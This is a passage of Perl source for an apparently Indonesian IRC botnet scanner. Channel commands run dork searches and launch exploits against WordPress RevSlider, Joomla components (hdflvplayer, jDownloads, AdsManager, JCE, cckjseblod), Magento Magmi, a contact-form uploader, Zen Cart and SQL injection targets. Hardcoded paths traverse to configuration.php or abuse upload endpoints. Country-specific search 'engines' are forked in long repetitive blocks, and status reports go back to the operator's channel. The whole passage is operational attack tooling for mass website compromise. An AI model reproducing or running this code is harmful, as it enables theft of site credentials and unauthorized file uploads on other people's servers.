										my $cekby22 = &get_content($jack22."aankfm");

										if ($cekby22 =~ /aankfm/i){ $bystats22 = "6Up!!!"; } else { $bystats22 = "4lost!!!"; } 

										my $cekby23= &get_content( $jack23."aankfm");

										if ($cekby23 =~ /aankfm/i){ $bystats23 = "6Up!!!"; } else { $bystats23 = "4lost!!!"; } 

										my $cekby24 = &get_content($jack24."aankfm");

										if ($cekby24 =~ /aankfm/i){ $bystats24 = "6Up!!!"; } else { $bystats24 = "4lost!!!"; } 

										my $cekby25 = &get_content($jack25."aankfm");

										if ($cekby25 =~ /aankfm/i){ $bystats25 = "6Up!!!"; } else { $bystats25 = "4lost!!!"; } 

										my $cekby26 = &get_content($jack26."aankfm");

										if ($cekby26 =~ /aankfm/i){ $bystats26 = "6Up!!!"; } else { $bystats26 = "4lost!!!"; } 

										my $cekby27 = &get_content($jack27."aankfm");

										if ($cekby27 =~ /aankfm/i){ $bystats27 = "6Up!!!"; } else { $bystats27 = "4lost!!!"; } 

										my $cekby28 = &get_content($jack28."aankfm");

										if ($cekby28 =~ /aankfm/i){ $bystats28 = "6Up!!!"; } else { $bystats28 = "4lost!!!"; } 

										my $cekby29 = &get_content($jack29."aankfm");

										if ($cekby29 =~ /aankfm/i){ $bystats29 = "6Up!!!"; } else { $bystats29 = "4lost!!!"; } 

										my $cekby30 = &get_content($jack30."aankfm");

										if ($cekby30 =~ /aankfm/i){ $bystats30 = "6Up!!!"; } else { $bystats30 = "4lost!!!"; }

                                        &msg("$chan","12 Mesin1= $bystats1 12 Mesin2= $bystats2 12 Mesin3= $bystats3 12 Mesin4= $bystats4 12Mesin5= $bystats5 12 Mesin6= $bystats6 12 Mesin7= $bystats7 12 Mesin8= $bystats8 12 Mesin9= $bystats9 12 Mesin10= $bystats10");sleep(2);

										&msg("$chan","12 Mesin11= $bystats11 12 Mesin12= $bystats12 12 Mesin13= $bystats13 12 Mesin14= $bystats14 12 Mesin15= $bystats15 12 Mesin16= $bystats16 12 Mesin17= $bystats17 12 Mesin18= $bystats18 12 Mesin19= $bystats19 12 Mesin20= $bystats20");sleep(2);

										&msg("$chan","12 Mesin21= $bystats21 12 Mesin22= $bystats22 12 Mesin23= $bystats23 12 Mesin24= $bystats24 12 Mesin25= $bystats25 12 Mesin26= $bystats26 12 Mesin27= $bystats27 12 Mesin28= $bystats28 12 Mesin29= $bystats29 12 Mesin30= $bystats30");sleep(2);

                                }}}

                ##################################################################### Command SCAN

               

                       

                if ($msg =~ /^$revcmd\s+(.*)/) {

                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

				my ($bug,$dork) = ("wp-admin/admin-ajax.php",$1);

                if (-e ($update_file)) {

                my $dork = $1;

                my $check = &read_dorks($dork);

                if ($check == 1) {

                &msg("$chan","$searchlogo 4Ga bisa $nick bangsattt...itu2 aja dorkmu boss.. "); exit;

                } else {

                &msg("$chan","$searchlogo 11Dork :4 $dork");

                &msg("$chan","$searchlogo 11 Starting ...");

                sendraw("MODE $chan +m");

                &write_dorks($dork);

                &se_start($chan,$bug,$dork,$engine,1,$nick);

                }

                }else {

                &msg("$chan","[ $nick ] $revlogo 4Injector is Lost!");

					}

					}

                exit;

                }

                }

               

			    ##############################################################################

				

				if ($msg =~ /^$cfxcmd\s+(.*)/) {

                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

				my ($bug,$dork) = ("/inc/upload.php?folder=/cfg-contactform/upload/&fileext=php",$1);

				my $check = &read_dorks($dork);

				if ($check == 1) {

				&msg("$chan","$searchlogo 3$nick, 4Please change dork!"); exit;

				} else {

				&msg("$chan","$searchlogo 12Dork7 :4 $dork");

				&msg("$chan","$searchlogo 6Search Engine Loading ...");

				&write_dorks($dork);

				&se_start($chan,$bug,$dork,$engine,2,$nick); 

					}

					}

				}

				}

				

				################################################################################

				

				if ($msg =~ /^$hdfcmd\s+(.*)/) { 

 				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { 

 				my ($bug,$dork) = ("/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php",$1); 

				my $check = &read_dorks($dork);

				if ($check == 1) {

				&msg("$chan","$searchlogo 3$nick, 4Please change dork!"); exit;

				} else {

				&msg("$chan","$searchlogo 12Dork7 :4 $dork");

				&msg("$chan","$searchlogo 6Search Engine Loading ...");

				&write_dorks($dork);

				&se_start($chan,$bug,$dork,$engine,3,$nick); 

					}

					}

				}

				}

				

				################################

				if ($msg =~ /^$jdlcmd\s+(.*)/) {

				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

				my ($bug,$dork) = ("/index.php?option=com_jdownloads&Itemid=0&view=upload",$1);

				my $check = &read_dorks($dork);

				if ($check == 1) {

				&msg("$chan","$searchlogo 3$nick, 4Please change dork!"); exit;

			} else {

				&msg("$chan","$searchlogo 4Dork7 :4 $dork");

				&msg("$chan","$searchlogo 6Search Engine Loading ...");

				&write_dorks($dork);

				&se_start($chan,$bug,$dork,$engine,4,$nick); 

 			}

		}

	}

}

				#################################

				if ($msg =~ /^$adscmd\s+(.*)/) {

                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

				my ($bug,$dork) = ("/index.php?option=com_adsmanager&task=upload&tmpl=component",$1);

				my $check = &read_dorks($dork);

				if ($check == 1) {

				&msg("$chan","$searchlogo 3$nick, 4Please change dork!"); exit;

			} else {

				&msg("$chan","$searchlogo 4Dork7 :4 $dork");

				&msg("$chan","$searchlogo 6Search Engine Loading ...");

				&write_dorks($dork);

				&se_start($chan,$bug,$dork,$engine,5,$nick); 

 			}

		}

	}

}



				if ($msg =~ /^$magcmd\s+(.*)/) {

                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

				my $dork = $1;

				my $check = &read_dorks($dork);

				if ($check == 1) {

				&msg("$chan","$searchlogo 3$nick, 7Please change dork!"); exit;

			} else {

				#&msg("$chan","$maglogo 7Dork7 :7 $dork");

				&msg("$chan","$searchlogo 6Search Engine Loading ...");

				&write_dorks($dork);

				&se_start($chan,$bug,$dork,$engine,6,$nick); 

 			}

		}

	}

}



				if ($msg =~ /^$jcecmd\s+(.*)/) {

				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

 				my ($bug,$dork) = ("/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b",$1); 

				my $check = &read_dorks($dork);

				if ($check == 1) {

				&msg("$chan","$searchlogo 3$nick, 7Please change dork!"); exit;

			} else {

				#&msg("$chan","$jcelogo 7Dork7 :7 $dork");

				&msg("$chan","$searchlogo 6Search Engine Loading ...");

				&write_dorks($dork);

				&se_start($chan,$bug,$dork,$engine,7,$nick);

 			}

		}

	}

}

#

				if ($msg =~ /^$magscmd\s+(.*)/) {

				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

					my ($bug,$dork) = ("/magmi/web/plugin_upload.php",$1);

					my $check = &read_dorks($dork);

					if ($check == 1) {

					&msg("$chan","$magslogo 11Ga bisa, 4$nick Bangsattt...!!, 11itu2 aja dorkmu boss.. "); exit;

					} else {

					&msg("$chan","15[4@15INFO15] 4$nick 11Be Patient Scanner On 4$chan ");

					&msg("$chan","$searchlogo 11 Loading Please Wait...4 Magento Uploader Started.! ");

					sendraw("MODE $chan +m");

					&write_dorks($dork);

					&se_start($chan,$bug,$dork,$engine,8,$nick);

			}

		}

	}

}		

#

				if ($msg =~ /^$cckjcmd\s+(.*)/) { 

 				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { 

 				my ($bug,$dork) = ("/index.php?option=com_cckjseblod&task=download&file=configuration.php",$1); 

				my $check = &read_dorks($dork);

				if ($check == 1) {

				&msg("$chan","$cckjlogo 3$nick, 4Please change dork!"); exit;

				} else {

				&msg("$chan","$searchlogo 12Dork7 :4 $dork");

				&msg("$chan","$searchlogo 6Search Engine Loading ...");

				&write_dorks($dork);

				&se_start($chan,$bug,$dork,$engine,9,$nick); 

					}

					}

				}

				}

####

				if ($msg=~ /^$sqlcmd\s+(.+?)\s+(.*)/) {

                if (my $pid = fork) { waitpid($pid, 0);} else {if (fork) { exit; } else {

                    my ($bug,$dork) = ($1,$2);

					my $check = &read_dorks($dork);

					if ($check == 1) {

						&msg("$chan","$sqllogo 3$nick, 4Please change dork!"); exit;

					} else {

                &msg("$chan","4,1[9/!\4] 13,1SiaP MeNcaRi TaRgeT...S.Q.L KoManDaN");

                &msg("$chan","4,1[14/!\4] 13DoRkz 4:0 $dork ");

                &msg("$chan","4,1[9/!\4] 13BuGz 4:0 $bug ");

                &msg("$chan","4,1[14/!\4] 9E9x3p3l3o9i9t9i3n3g15.14.15.14.");

				&write_dorks($dork);

                &se_start($chan,$bug,$dork,$engine,10,$nick); 

							}

                        }

                    }

                }

####

				

				#################################

				if ($msg =~ /^$zencmd\s+(.*)/) {

                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

				if (-e ($zenfile)) {

					my ($bug,$dork) = ("extras/curltest.php",$1);

					my $check = &read_dorks($dork);

				if ($check == 1) {

						&msg("$chan","$zenlogo 4Ga bisa $nick bangsattt...itu2 aja dorkmu boss.. "); exit;

					} else {

						&msg("$chan","$zenlogo 3Si $nick lagi scan Zencart di $chan ");	

						&msg("$chan","$zenlogo 12Dork :4 $dork");

						&msg("$chan","14scanning zen cart started...");

						sendraw("MODE $chan +m");

						&write_dorks($dork);

				&se_start($chan,$bug,$dork,$engine,11,$nick);		

					}

				}else {

				&msg("$chan","[ $nick ] $zenlogo 4Injector is Lost!");

					}

					}

				exit;

				}

				}

				

                #####################################################################

 

				}

			}

		

 

        for(my $c=0; $c<= $#lines; $c++) {

            $line = $lines[$c];

            $line = $line_temp.$line if ($line_temp);

            $line_temp = '';

            $line =~ s/\r$//;

            unless ($c == $#lines) {

                parse("$line");

            } else {

                if ($#lines == 0) {

                    parse("$line");

                } elsif ($lines[$c] =~ /\r$/) {

                    parse("$line");

                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {

                    parse("$line");

                } else {

                    $line_temp = $line;

                }

            }

        }

    }

} 

##########################################################################################      Search engine

sub type() {

my ($chan,$bug,$dork,$engine,$type,$nick) = @_;

           if ($type == 1){$type=&revslider($chan,$bug,$dork,$engine,$nick);}

        elsif ($type == 2){$type=&cfx_exploit($chan,$bug,$dork,$engine,$nick);}

		elsif ($type == 3){$type=&hdf_exploit($chan,$bug,$dork,$engine,$nick);}

		elsif ($type == 4){$type=&jdl_exploit($chan,$bug,$dork,$engine,$nick);}

		elsif ($type == 5){$type=&ads_exploit($chan,$bug,$dork,$engine,$nick);}

		elsif ($type == 6){$type=&mag_exploit($chan,$bug,$dork,$engine,$nick);}

		elsif ($type == 7){$type=&jce_exploit($chan,$bug,$dork,$engine,$nick);}

		elsif ($type == 8){$type=&magmi_exploit($chan,$bug,$dork,$engine,$nick);}

		elsif ($type == 9){$type=&cckjseblod($chan,$bug,$dork,$engine,$nick);}

		elsif ($type == 10){$type=&sql_exploit($chan,$bug,$dork,$engine,$nick);}

		elsif ($type == 11){$type=&zen($chan,$bug,$dork,$engine,$nick);}

}      

sub se_start() {

my ($chan,$bug,$dork,$engine,$type,$nick) = @_;



		if ($engine =~ /aanK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"aanK",$type); } exit; } }

		if ($engine =~ /coi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"coi",$type); } exit; } }

		if ($engine =~ /roin/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"roin",$type); } exit; } }

		if ($engine =~ /Keren/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Keren",$type); } exit; } }

		if ($engine =~ /Beken/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Beken",$type); } exit; } }

		if ($engine =~ /kangkung/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"kangkung",$type); } exit; } }

		if ($engine =~ /successor/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"successor",$type); } exit; } }

		if ($engine =~ /Brewok/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Brewok",$type); } exit; } }

		if ($engine =~ /Marlboro/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Marlboro",$type); } exit; } }

		if ($engine =~ /Prince/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Prince",$type); } exit; } }	

		if ($engine =~ /Cita-Citata/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cita-Citata",$type,$nick); } exit; } }

        if ($engine =~ /Depe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Depe",$type,$nick); } exit; } }

        if ($engine =~ /Jupe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"JuPe",$type,$nick); } exit; } }

        if ($engine =~ /Ayu-tingting/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ayu-tingting",$type,$nick); } exit; } }

        if ($engine =~ /Siti-badriah/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Siti-badriah",$type,$nick); } exit; } }

        if ($engine =~ /Zaskia-Gotik/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Zaskia-Gotik",$type,$nick); } exit; } }

        if ($engine =~ /Hesty/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Hesty",$type,$nick); } exit; } }

        if ($engine =~ /InuL-darasista/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"InuL-darasista",$type,$nick); } exit; } }

        if ($engine =~ /Duo-Racun/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Duo-Racun",$type,$nick); } exit; } }

        if ($engine =~ /Juwita-Bahar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Juwita-Bahar",$type,$nick); } exit; } }

        if ($engine =~ /Uut/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uut",$type,$nick); } exit; } }

        if ($engine =~ /Tuty-Wibowo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tuty-Wibowo",$type,$nick); } exit; } }

        if ($engine =~ /MeLa-Berby/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"MeLa-Berby",$type,$nick); } exit; } }

        if ($engine =~ /Ria-Amelia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ria-Amelia",$type,$nick); } exit; } }

        if ($engine =~ /Melinda/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Melinda",$type,$nick); } exit; } }

        if ($engine =~ /Dewinta-Bahar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Dewinta-Bahar",$type,$nick); } exit; } }

        if ($engine =~ /Lia-Emilia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Lia-Emilia",$type,$nick); } exit; } }

        if ($engine =~ /Ade-Irma/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ade-Irma",$type,$nick); } exit; } }

        if ($engine =~ /Shinta-n-Jojo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Shinta-n-Jojo",$type,$nick); } exit; } }

        if ($engine =~ /Jenita-Janet/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Jenita-Janet",$type,$nick); } exit; } } 

        if ($engine =~ /uae/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"UAE",$type,$nick); } exit; } }

        if ($engine =~ /myanmar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Myanmar",$type,$nick); } exit; } }

        if ($engine =~ /argentina/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Argentina",$type,$nick); } exit; } }

        if ($engine =~ /austria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Austria",$type,$nick); } exit; } }

        if ($engine =~ /australia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Australia",$type,$nick); } exit; } }

        if ($engine =~ /brazil/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Brazil",$type,$nick); } exit; } }

        if ($engine =~ /canada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Canada",$type,$nick); } exit; } }

        if ($engine =~ /chili/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Chili",$type,$nick); } exit; } }

        if ($engine =~ /cina/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cina",$type,$nick); } exit; } }

        if ($engine =~ /comersil/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"CoMersil",$type,$nick); } exit; } }

        if ($engine =~ /czech/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Czech",$type,$nick); } exit; } }

        if ($engine =~ /germany/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Germany",$type,$nick); } exit; } }

        if ($engine =~ /denmark/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Denmark",$type,$nick); } exit; } }

        if ($engine =~ /spain/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Spain",$type,$nick); } exit; } }

        if ($engine =~ /europe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Europe",$type,$nick); } exit; } }

        if ($engine =~ /france/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"France",$type,$nick); } exit; } }

        if ($engine =~ /hungary/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Hungary",$type,$nick); } exit; } }

        if ($engine =~ /indonesia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Indonesia",$type,$nick); } exit; } }

        if ($engine =~ /israel/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Israel",$type,$nick); } exit; } }

        if ($engine =~ /india/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"India",$type,$nick); } exit; } }

        if ($engine =~ /info/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Info",$type,$nick); } exit; } }

        if ($engine =~ /iran/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Iran",$type,$nick); } exit; } }

        if ($engine =~ /italy/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Italy",$type,$nick); } exit; } }

        if ($engine =~ /japan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Japan",$type,$nick); } exit; } }

        if ($engine =~ /korea/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Korea",$type,$nick); } exit; } }

        if ($engine =~ /mexico/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mexico",$type,$nick); } exit; } }

        if ($engine =~ /malaysia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Malaysia",$type,$nick); } exit; } }

        if ($engine =~ /network/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Network",$type,$nick); } exit; } }

        if ($engine =~ /netherlands/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Netherlands",$type,$nick); } exit; } }

        if ($engine =~ /organization/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Organization",$type,$nick); } exit; } }

        if ($engine =~ /philippines/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Philippines",$type,$nick); } exit; } }

        if ($engine =~ /poland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Poland",$type,$nick); } exit; } }

        if ($engine =~ /romania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Romania",$type,$nick); } exit; } }

        if ($engine =~ /russian/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Russian",$type,$nick); } exit; } }    

        if ($engine =~ /thailand/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Thailand",$type,$nick); } exit; } }

        if ($engine =~ /ukraine/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ukraine",$type,$nick); } exit; } }

        if ($engine =~ /england/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"England",$type,$nick); } exit; } }

        if ($engine =~ /usa/i)	 { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"USA",$type,$nick); } exit; } }

        if ($engine =~ /slovenia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Slovenia",$type,$nick); } exit; } }

        if ($engine =~ /belgium/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Belgium",$type,$nick); } exit; } }

        if ($engine =~ /bussines/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bussines",$type,$nick); } exit; } }

        if ($engine =~ /southafrica/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SouthAfrica",$type,$nick); } exit; } }

        if ($engine =~ /vietnam/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Vietnam",$type,$nick); } exit; } }

        if ($engine =~ /tuvalu/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tuvalu",$type,$nick); } exit; } }

        if ($engine =~ /cocos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cocos",$type,$nick); } exit; } }

        if ($engine =~ /turky/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Turky",$type,$nick); } exit; } }

        if ($engine =~ /asia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Asia",$type,$nick); } exit; } }

        if ($engine =~ /serbia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Serbia",$type,$nick); } exit; } }

        if ($engine =~ /singapore/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Singapore",$type,$nick); } exit; } }

        if ($engine =~ /taiwan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Taiwan",$type,$nick); } exit; } }

        if ($engine =~ /sweden/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Sweden",$type,$nick); } exit; } }

        if ($engine =~ /pakistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Pakistan",$type,$nick); } exit; } }

        if ($engine =~ /norway/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Norway",$type,$nick); } exit; } }

        if ($engine =~ /montenegro/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Montenegro",$type,$nick); } exit; } }

        if ($engine =~ /greece/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Greece",$type,$nick); } exit; } }

        if ($engine =~ /education/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Education",$type,$nick); } exit; } }

        if ($engine =~ /goverment/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Goverment",$type,$nick); } exit; } }

        if ($engine =~ /kazakhstan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kazakhstan",$type,$nick); } exit; } }

        if ($engine =~ /afganistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Afganistan",$type,$nick); } exit; } }

        if ($engine =~ /albania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Albania",$type,$nick); } exit; } }

        if ($engine =~ /algeria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Algeria",$type,$nick); } exit; } }

        if ($engine =~ /angola/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Angola",$type,$nick); } exit; } }

        if ($engine =~ /armenia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Armenia",$type,$nick); } exit; } }

        if ($engine =~ /azerbaijan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Azerbaijan",$type,$nick); } exit; } }

        if ($engine =~ /bahrain/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bahrain",$type,$nick); } exit; } }

        if ($engine =~ /bangladesh/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bangladesh",$type,$nick); } exit; } }

        if ($engine =~ /belarus/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Belarus",$type,$nick); } exit; } }

        if ($engine =~ /bhutan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bhutan",$type,$nick); } exit; } }

        if ($engine =~ /bolivia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bolivia",$type,$nick); } exit; } }

        if ($engine =~ /bosnia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bosnia",$type,$nick); } exit; } }

        if ($engine =~ /bulgaria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bulgaria",$type,$nick); } exit; } }

        if ($engine =~ /brunei/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Brunei",$type,$nick); } exit; } }

        if ($engine =~ /cambodia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cambodia",$type,$nick); } exit; } }

